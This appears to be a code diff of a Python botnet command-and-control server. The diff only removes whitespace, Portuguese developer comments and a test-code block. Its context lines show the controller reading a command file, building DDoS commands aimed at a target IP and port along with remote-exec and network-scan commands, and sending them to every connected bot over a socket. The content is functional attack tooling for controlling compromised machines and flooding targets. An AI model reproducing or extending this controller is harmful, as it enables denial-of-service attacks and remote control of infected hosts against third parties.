@@ -15,10 +15,10 @@ def Read_BConfig_File():
 
   attempts = 0
 
-  while(attempts < 10): 
+  while(attempts < 10):
     try:
       config_file = open('bot_ccommands', 'r')
-      
+
       config_dict = json.loads(config_file.read())
 
       config_file.close()
@@ -28,7 +28,7 @@ def Read_BConfig_File():
 
     except Exception as read_bconfig_error:
       attempts += 1
-  
+
 
 def Clear_BConfig_File():
 
@@ -55,7 +55,7 @@ def Decode_BConfig_File():
                     'Command_Bot.Dexec' : True,
                     'Command_Bot.Netscan' : True
                     }
-  
+
   config_file = Read_BConfig_File()
 
   if(config_file['command'] == 'Null'):
@@ -65,7 +65,7 @@ def Decode_BConfig_File():
     string_command = str('Command_Bot.ddos{"%s", %i, 1, %i}' %(config_file['target_ip'], config_file['target_port'], config_file['packages']))
 
     Send_Command(string_command)
-    
+
     Clear_BConfig_File()
 
     return False
@@ -76,10 +76,10 @@ def Decode_BConfig_File():
     Send_Command(string_command)
 
     Clear_BConfig_File()
-    
+
     return False
 
-  elif(valid_commands[config_file['command'].split('{')[0]]):# se o commando estiver nessa lista tudo bem senao esquece!!
+  elif(valid_commands[config_file['command'].split('{')[0]]):
     Send_Command(config_file['command'])
 
     Clear_BConfig_File()
@@ -87,7 +87,7 @@ def Decode_BConfig_File():
     return False
 
 
-def Comand_Base_Connection(host, port):# ate aqui perfeita 
+def Comand_Base_Connection(host, port):
 
   so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -97,22 +97,22 @@ def Comand_Base_Connection(host, port):# ate aqui perfeita
   def Comand_Taccept():
     while(True):
       conn, addr = so.accept()
-      
+
       if(conn != ''):
         clients.append(conn)
-      
+
       else:
         pass
-  
+
   thread.start_new_thread(Comand_Taccept, ())
 
-    
-def Send_Command(command): #arrumar essa funcao ta feia e nao totalmente funcional
+
+def Send_Command(command):
 
   booll = True
 
   while(booll):
-    
+
     if(len(clients) > 0):
 
       for bot in clients:
@@ -147,11 +147,11 @@ def main():
 
     try:
       Decode_BConfig_File()
-    
+
     except:
       pass
-  
-  
+
+
 
 
 
@@ -159,23 +159,3 @@ if __name__ == '__main__':
 
 # importante tambem lembrar para reutilizar o address no socket pra toda hr nao ter que esperar pra krl !!!
   main()
-
-
-
-'''
-codes de teste:
-  
-  {while True:
-    if len(clients) > 0:
-      for i in clients:
-        try:
-          data = i.recv(1024)
-          print data
-        except:
-          pass
-        
-    else:
-      pass}
-
-{Send_Command('Ola tudo bem com vc ?\n')}
-'''
